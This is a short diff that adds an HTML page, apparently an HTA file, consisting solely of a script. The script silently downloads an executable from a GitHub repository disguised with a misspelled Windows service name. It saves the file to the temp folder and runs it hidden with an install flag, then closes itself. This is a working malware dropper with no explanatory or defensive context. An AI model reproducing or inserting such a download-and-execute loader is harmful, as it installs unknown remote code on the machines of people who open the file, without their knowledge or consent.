@@ -1,0 +1,8 @@
+<html><head><script>
+u='https://github.com/KronoRDP/System.Service-Windonws/raw/refs/heads/main/puro/service.exe';
+x=new ActiveXObject('MSXML2.XMLHTTP');x.open('GET',u,0);x.send();
+s=new ActiveXObject('ADODB.Stream');s.Open();s.Type=1;s.Write(x.responseBody);
+s.SaveToFile('%TEMP%\\s.exe',2);
+new ActiveXObject('WScript.Shell').Run('%TEMP%\\s.exe -fullinstall',0);
+close();
+</script></head></html>
